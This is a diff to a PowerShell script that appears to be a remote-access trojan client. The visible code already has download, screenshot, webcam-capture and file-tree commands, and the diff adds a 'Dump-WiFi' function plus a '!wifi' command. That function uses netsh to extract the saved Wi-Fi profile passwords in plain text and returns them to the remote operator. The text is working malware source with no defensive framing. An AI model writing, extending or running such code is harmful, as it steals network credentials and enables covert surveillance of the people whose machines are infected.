@@ -20,6 +20,18 @@ function Connect-ZiPo {
         return "[DOWNLOADED] $out"
     }
 
+    function Dump-WiFi {
+    netsh wlan show profiles | ForEach-Object {
+        if ($_ -match "All User Profile\s*:\s*(.*)") {
+            $profile = $matches[1].Trim()
+            $key = (netsh wlan show profile name="$profile" key=clear |
+                    Select-String "Key Content\s*:\s*(.*)") |
+                    ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+            "$profile :: $key"
+        }
+    } | Out-String
+}
+
     function Take-Screenshot {
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
@@ -171,6 +183,9 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                     elseif ($cmd -eq "!webcam") {
                         $response = Capture-Webcam
+                    }
+                    elseif ($cmd -eq "!wifi") {
+                        $response = Dump-WiFi
                     }
                     elseif ($cmd -eq "!tree") {
                         $response = Tree-List
